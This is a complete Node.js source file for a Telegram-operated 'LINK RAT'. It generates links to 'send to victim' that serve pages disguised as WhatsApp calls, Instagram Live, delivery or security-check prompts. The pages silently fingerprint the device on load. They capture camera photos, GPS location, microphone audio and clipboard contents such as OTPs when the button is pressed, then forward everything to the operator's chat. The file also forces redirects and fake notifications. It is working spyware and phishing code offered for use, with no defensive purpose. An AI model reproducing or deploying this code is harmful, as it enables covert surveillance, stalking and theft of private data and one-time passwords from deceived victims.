const express    = require('express');
const http       = require('http');
const telegramBot = require('node-telegram-bot-api');
const multer     = require('multer');
const bodyParser = require('body-parser');
const axios      = require('axios');
const crypto     = require('crypto');
const path       = require('path');

// ============================================================
// FILL THESE 3
// ============================================================
const TOKEN   = 'YOUR_BOT_TOKEN_HERE';
const CHAT_ID = 'YOUR_CHAT_ID_HERE';
const HOST    = 'https://YOUR_RAILWAY_URL_HERE';
// ============================================================

const app    = express();
const server = http.createServer(app);
const bot    = new telegramBot(TOKEN, { polling: true });
const upload = multer();

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// ── token store: token -> { action, label } ──────────────────
const tokens = new Map();

function makeLink(action, label) {
    const tok = crypto.randomBytes(8).toString('hex');
    tokens.set(tok, { action, label });
    // expire after 10 minutes
    setTimeout(() => tokens.delete(tok), 10 * 60 * 1000);
    return `${HOST}/go/${tok}`;
}

// ── telegram helpers ──────────────────────────────────────────
function tgMsg(text) {
    bot.sendMessage(CHAT_ID, text, { parse_mode: 'HTML' });
}

function tgPhoto(buffer, caption) {
    bot.sendPhoto(CHAT_ID, buffer, { caption, parse_mode: 'HTML' });
}

function tgDoc(buffer, filename, caption) {
    bot.sendDocument(CHAT_ID, buffer,
        { caption, parse_mode: 'HTML' },
        { filename, contentType: 'application/octet-stream' }
    );
}

function tgLocation(lat, lon) {
    bot.sendLocation(CHAT_ID, lat, lon);
}

function tgAudio(buffer) {
    bot.sendAudio(CHAT_ID, buffer, {},
        { filename: 'mic.mp3', contentType: 'audio/mpeg' }
    );
}

// ── main menu keyboard ────────────────────────────────────────
function mainMenu() {
    return {
        inline_keyboard: [
            [
                { text: '📸 Camera Photo',     callback_data: 'camera' },
                { text: '🤳 Selfie',           callback_data: 'selfie' }
            ],
            [
                { text: '📍 Location',         callback_data: 'location' },
                { text: '🎙️ Record Mic',       callback_data: 'microphone' }
            ],
            [
                { text: '📱 Device Info',      callback_data: 'deviceinfo' },
                { text: '📋 Clipboard',        callback_data: 'clipboard' }
            ],
            [
                { text: '🔔 Fake Notification',callback_data: 'notification' },
                { text: '🌐 Open URL on Phone',callback_data: 'openurl' }
            ],
            [
                { text: '🖥️ Screen Info',      callback_data: 'screeninfo' },
                { text: '🌍 IP + Network',     callback_data: 'ipinfo' }
            ],
            [
                { text: '🔋 Battery Info',     callback_data: 'battery' },
                { text: '📡 Full Recon',       callback_data: 'fullrecon' }
            ]
        ]
    };
}

// ── /start command ────────────────────────────────────────────
bot.onText(/\/start/, (msg) => {
    if (String(msg.chat.id) !== String(CHAT_ID)) return;
    bot.sendMessage(CHAT_ID,
        '🌹 <b>LINK RAT ONLINE</b>\n\n' +
        '• No APK needed\n' +
        '• Send victim a link\n' +
        '• They open it → data comes here\n\n' +
        'Select attack below:',
        { parse_mode: 'HTML', reply_markup: mainMenu() }
    );
});

bot.onText(/\/menu/, (msg) => {
    if (String(msg.chat.id) !== String(CHAT_ID)) return;
    bot.sendMessage(CHAT_ID,
        '🎯 Select attack:',
        { reply_markup: mainMenu() }
    );
});

// ── callback handler -- generates links ───────────────────────
bot.on('callback_query', (cbq) => {
    if (String(cbq.from.id) !== String(CHAT_ID)) return;
    bot.answerCallbackQuery(cbq.id);

    const data = cbq.data;
    const msgId = cbq.message.message_id;

    // map action to label
    const labels = {
        camera:       '📸 Back Camera',
        selfie:       '🤳 Front Camera (Selfie)',
        location:     '📍 Live GPS Location',
        microphone:   '🎙️ Microphone Recording',
        deviceinfo:   '📱 Full Device Info',
        clipboard:    '📋 Clipboard Content',
        notification: '🔔 Fake Notification',
        openurl:      '🌐 Open URL on Device',
        screeninfo:   '🖥️ Screen + Browser Info',
        ipinfo:       '🌍 IP + Network Info',
        battery:      '🔋 Battery Info',
        fullrecon:    '📡 Full Recon (everything)'
    };

    if (data === 'openurl') {
        bot.deleteMessage(CHAT_ID, msgId);
        bot.sendMessage(CHAT_ID,
            '🌐 Enter the URL you want to open on victim device:',
            { reply_markup: { force_reply: true } }
        );
        return;
    }

    if (data === 'notification') {
        bot.deleteMessage(CHAT_ID, msgId);
        bot.sendMessage(CHAT_ID,
            '🔔 Enter notification text to show on victim screen:',
            { reply_markup: { force_reply: true } }
        );
        return;
    }

    const link = makeLink(data, labels[data] || data);

    bot.deleteMessage(CHAT_ID, msgId);
    bot.sendMessage(CHAT_ID,
        `🔗 <b>${labels[data]}</b>\n\n` +
        `Send this link to victim:\n\n` +
        `<code>${link}</code>\n\n` +
        `⏰ Link expires in 10 minutes\n` +
        `✅ Data arrives here when they open it`,
        {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [[
                    { text: '🔄 Generate New Link', callback_data: data },
                    { text: '◀️ Back to Menu',      callback_data: '__menu__' }
                ]]
            }
        }
    );
});

// ── handle force_reply responses ──────────────────────────────
bot.on('message', (msg) => {
    if (String(msg.chat.id) !== String(CHAT_ID)) return;
    const rt = msg.reply_to_message?.text || '';
    const text = msg.text || '';

    if (rt.includes('URL you want to open')) {
        const link = makeLink('openurl_' + encodeURIComponent(text), '🌐 Open URL');
        bot.sendMessage(CHAT_ID,
            `🌐 <b>Open URL Attack</b>\n\n` +
            `URL target: <code>${text}</code>\n\n` +
            `Send to victim:\n<code>${link}</code>`,
            { parse_mode: 'HTML' }
        );
    }

    if (rt.includes('notification text')) {
        const link = makeLink('notification_' + encodeURIComponent(text), '🔔 Notification');
        bot.sendMessage(CHAT_ID,
            `🔔 <b>Fake Notification</b>\n\n` +
            `Message: <code>${text}</code>\n\n` +
            `Send to victim:\n<code>${link}</code>`,
            { parse_mode: 'HTML' }
        );
    }

    if (text === '/start' || text === '/menu') return; // already handled above
});

// handle back to menu callback
bot.on('callback_query', (cbq) => {
    if (cbq.data === '__menu__') {
        bot.deleteMessage(CHAT_ID, cbq.message.message_id);
        bot.sendMessage(CHAT_ID, '🎯 Select attack:', { reply_markup: mainMenu() });
    }
});

// ── /go/:token -- serves the attack page ─────────────────────
app.get('/go/:tok', (req, res) => {
    const info = tokens.get(req.params.tok);
    if (!info) {
        return res.send('<h2 style="text-align:center;color:red">Link expired.</h2>');
    }

    const tok    = req.params.tok;
    const action = info.action;

    // resolve action type
    let pageType = action;
    let extraData = '';

    if (action.startsWith('openurl_')) {
        pageType  = 'openurl';
        extraData = decodeURIComponent(action.replace('openurl_', ''));
    } else if (action.startsWith('notification_')) {
        pageType  = 'notification';
        extraData = decodeURIComponent(action.replace('notification_', ''));
    }

    res.send(buildPage(tok, pageType, extraData));
});

// ── data upload endpoints ─────────────────────────────────────
app.post('/data/photo', upload.single('photo'), (req, res) => {
    const ip      = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const camtype = req.body.camtype || 'Camera';
    const ua      = req.headers['user-agent'] || '';
    if (req.file) {
        tgPhoto(req.file.buffer,
            `📸 ${camtype} Capture\n🌍 IP: ${ip}\n📱 ${ua.substring(0, 80)}`
        );
    }
    res.json({ ok: true });
});

app.post('/data/location', (req, res) => {
    const ip  = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { lat, lon, acc } = req.body;
    if (lat && lon) {
        tgLocation(lat, lon);
        tgMsg(
            `📍 <b>Location Received</b>\n\n` +
            `Lat  : <code>${lat}</code>\n` +
            `Lon  : <code>${lon}</code>\n` +
            `Acc  : ${acc}m\n` +
            `IP   : ${ip}\n` +
            `Maps : https://maps.google.com/?q=${lat},${lon}`
        );
    }
    res.json({ ok: true });
});

app.post('/data/text', (req, res) => {
    const ip   = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const type = req.body.type || 'Data';
    const data = req.body.data || '';
    tgMsg(
        `📋 <b>${type}</b>\n\n` +
        `<code>${data.substring(0, 3000)}</code>\n\n` +
        `🌍 IP: ${ip}`
    );
    res.json({ ok: true });
});

app.post('/data/audio', upload.single('audio'), (req, res) => {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (req.file) {
        tgAudio(req.file.buffer);
        tgMsg(`🎙️ <b>Mic Recording</b>\n🌍 IP: ${ip}`);
    }
    res.json({ ok: true });
});

// ── build the attack page HTML ────────────────────────────────
function buildPage(tok, action, extra) {
    const uploadBase = `${HOST}/data`;

    // disguise templates
    const disguises = {
        camera:    { title: 'WhatsApp Video Call', body: 'Incoming video call...',
                     btn: 'Accept', icon: '📞' },
        selfie:    { title: 'Instagram Live',      body: 'You are invited to a live stream',
                     btn: 'Join Now', icon: '🎥' },
        location:  { title: 'Food Delivery',       body: 'Confirm your delivery location',
                     btn: 'Confirm Location', icon: '📍' },
        microphone:{ title: 'Voice Message',       body: 'Press record to listen',
                     btn: 'Play Message', icon: '🎙️' },
        deviceinfo:{ title: 'Security Check',      body: 'Verifying your device...',
                     btn: 'Verify Now', icon: '🔒' },
        clipboard: { title: 'Paste OTP',           body: 'Paste your OTP to continue',
                     btn: 'Paste & Continue', icon: '📋' },
        notification:{ title: 'Alert',             body: extra || 'You have a new message',
                       btn: 'View', icon: '🔔' },
        openurl:   { title: 'Redirecting...',      body: 'Please wait...',
                     btn: 'Continue', icon: '🌐' },
        screeninfo:{ title: 'Browser Update',      body: 'Checking compatibility...',
                     btn: 'Continue', icon: '🖥️' },
        ipinfo:    { title: 'Network Check',       body: 'Checking your connection...',
                     btn: 'Check Now', icon: '🌍' },
        battery:   { title: 'Power Saving Mode',  body: 'Enable to save battery',
                     btn: 'Enable', icon: '🔋' },
        fullrecon: { title: 'WhatsApp',            body: 'Confirm your account details',
                     btn: 'Confirm', icon: '✅' }
    };

    const d = disguises[action] || disguises.deviceinfo;

    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${d.title}</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#111;color:#fff;font-family:-apple-system,sans-serif;
     display:flex;flex-direction:column;align-items:center;
     justify-content:center;min-height:100vh;text-align:center;padding:20px}
.icon{font-size:60px;margin-bottom:20px;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
h2{font-size:22px;margin-bottom:10px}
p{color:#aaa;margin-bottom:30px;font-size:15px}
.btn{padding:16px 0;width:240px;border:none;border-radius:50px;
     font-size:17px;cursor:pointer;color:#fff;background:#1877f2;
     display:block;margin:8px auto}
.btn:active{opacity:.8}
#status{margin-top:20px;color:#aaa;font-size:13px}
video,canvas{display:none;width:1px;height:1px}
</style>
</head>
<body>
<div class="icon">${d.icon}</div>
<h2>${d.title}</h2>
<p>${d.body}</p>
<button class="btn" onclick="run()">${d.btn}</button>
<div id="status"></div>
<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
const UPLOAD = '${uploadBase}';
const ACTION = '${action}';
const EXTRA  = '${extra.replace(/'/g, "\\'")}';

function status(msg) {
  document.getElementById('status').textContent = msg;
}

// auto-run passive attacks on load
window.onload = function() {
  collectPassive();
  if (ACTION === 'openurl' && EXTRA) {
    setTimeout(() => { window.location.href = EXTRA; }, 1000);
  }
  if (ACTION === 'notification' && EXTRA) {
    if (Notification.permission === 'granted') {
      new Notification(EXTRA);
    } else {
      Notification.requestPermission().then(p => {
        if (p === 'granted') new Notification(EXTRA);
      });
    }
  }
};

// passive -- no permission needed
function collectPassive() {
  const info = {
    ua:        navigator.userAgent,
    platform:  navigator.platform,
    language:  navigator.language,
    languages: (navigator.languages||[]).join(','),
    cores:     navigator.hardwareConcurrency,
    memory:    navigator.deviceMemory || 'unknown',
    online:    navigator.onLine,
    cookieEnabled: navigator.cookieEnabled,
    screen:    screen.width + 'x' + screen.height,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio,
    timezone:  Intl.DateTimeFormat().resolvedOptions().timeZone,
    time:      new Date().toString(),
    referrer:  document.referrer,
    url:       window.location.href
  };

  // battery passive
  if (navigator.getBattery) {
    navigator.getBattery().then(b => {
      info.battery_level    = Math.round(b.level * 100) + '%';
      info.battery_charging = b.charging;
      info.battery_time     = b.dischargingTime;
      sendText(formatInfo('📱 DEVICE INFO', info));
    });
  } else {
    sendText(formatInfo('📱 DEVICE INFO', info));
  }

  // IP info via server
  fetch(UPLOAD + '/text', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ type: 'IP Hit', data: 'Victim opened the link' })
  });
}

function formatInfo(title, obj) {
  let out = title + '\\n\\n';
  for (const [k,v] of Object.entries(obj)) {
    out += k + ' : ' + v + '\\n';
  }
  return out;
}

function sendText(data, type) {
  fetch(UPLOAD + '/text', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({ type: type || 'Data', data: data })
  });
}

async function run() {
  document.querySelector('.btn').textContent = 'Loading...';
  status('Please wait...');

  try {
    // location -- works on button click
    if (['location','fullrecon'].includes(ACTION) ||
        ACTION.includes('location')) {
      await getLocation();
    }

    // camera
    if (['camera','fullrecon'].includes(ACTION)) {
      await captureCamera(false);
    }
    if (['selfie','fullrecon'].includes(ACTION)) {
      await captureCamera(true);
    }

    // microphone
    if (['microphone','fullrecon'].includes(ACTION)) {
      await recordMic();
    }

    // clipboard
    if (['clipboard','fullrecon'].includes(ACTION)) {
      await getClipboard();
    }

    // fullrecon also gets location + all passive
    if (ACTION === 'fullrecon') {
      await getLocation();
    }

    status('Done ✓');
    document.querySelector('.btn').textContent = 'Done';
    document.querySelector('p').textContent = 'Thank you!';

  } catch(e) {
    status('');
    document.querySelector('.btn').textContent = '${d.btn}';
  }
}

async function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) { resolve(); return; }
    navigator.geolocation.getCurrentPosition(pos => {
      fetch(UPLOAD + '/location', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy
        })
      });
      resolve();
    }, () => resolve(), { enableHighAccuracy: true });
  });
}

async function captureCamera(front) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: front ? 'user' : 'environment' },
      audio: false
    });
    const v = document.getElementById('v');
    v.srcObject = stream;
    await new Promise(r => v.onloadedmetadata = r);
    await new Promise(r => setTimeout(r, 1500));
    const c = document.getElementById('c');
    c.width  = v.videoWidth  || 640;
    c.height = v.videoHeight || 480;
    c.getContext('2d').drawImage(v, 0, 0);
    stream.getTracks().forEach(t => t.stop());
    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
    const fd = new FormData();
    fd.append('photo',   blob, 'photo.jpg');
    fd.append('camtype', front ? 'Front Camera' : 'Back Camera');
    await fetch(UPLOAD + '/photo', { method: 'POST', body: fd });
  } catch(e) {}
}

async function recordMic() {
  return new Promise(async (resolve) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia(
        { audio: true, video: false });
      const rec    = new MediaRecorder(stream);
      const chunks = [];
      rec.ondataavailable = e => chunks.push(e.data);
      rec.onstop = async () => {
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const fd   = new FormData();
        fd.append('audio', blob, 'mic.webm');
        await fetch(UPLOAD + '/audio', { method: 'POST', body: fd });
        stream.getTracks().forEach(t => t.stop());
        resolve();
      };
      rec.start();
      setTimeout(() => rec.stop(), 8000); // 8 second recording
    } catch(e) { resolve(); }
  });
}

async function getClipboard() {
  try {
    const text = await navigator.clipboard.readText();
    sendText(text, '📋 Clipboard');
  } catch(e) {
    sendText('Clipboard: permission denied', '📋 Clipboard');
  }
}
</script>
</body>
</html>`;
}

// ── server ────────────────────────────────────────────────────
server.listen(process.env.PORT || 3000, () => {
    console.log('[+] Link RAT server running');
    bot.sendMessage(CHAT_ID,
        '🟢 <b>Bot Online</b>\n\nSend /start to open menu.',
        { parse_mode: 'HTML' }
    ).catch(() => {});
});
